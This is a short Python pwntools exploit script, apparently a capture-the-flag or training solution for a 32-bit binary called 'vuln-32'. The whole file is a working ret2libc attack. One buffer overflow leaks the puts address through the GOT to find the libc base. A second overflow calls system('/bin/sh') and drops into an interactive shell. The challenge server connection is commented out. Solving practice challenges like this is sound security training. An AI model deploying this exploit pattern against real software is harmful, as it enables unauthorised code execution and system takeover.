from pwn import *
from time import sleep

EX_NAME = './vuln-32'

elf = ELF(EX_NAME)
context.arch = 'x86'
context.terminal = ['konsole', '-e']

if 'REM' in os.environ:
    # p = remote('leakers.training.offensivedefensive.it', 8080, ssl=True)
    print('NO REMOTE!')
else:
    if 'GDB' in os.environ:
        print('DEBUG MODE')
        p = gdb.debug(EX_NAME, api=True, gdbscript='''
        c
        ''')
    else:
        p = elf.process()

def dbg_stop():
    if 'GDB' in os.environ:
        input('Waiting...')

sleep(0.5)
log.info(p.clean())

sleep(0.5)
p.sendline(flat(
    b'A'*0x20,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
))

sleep(0.5)
lk = u32(p.recv(4))
log.success(hex(lk))
log.info(p.clean())

libc = elf.libc
libc.address = lk - libc.sym['puts']

sleep(0.5)
p.sendline(flat(
    b'A'*0x20,
    libc.sym['system'],
    0x0,
    next(libc.search('/bin/sh'))
))

sleep(0.5)
p.interactive()
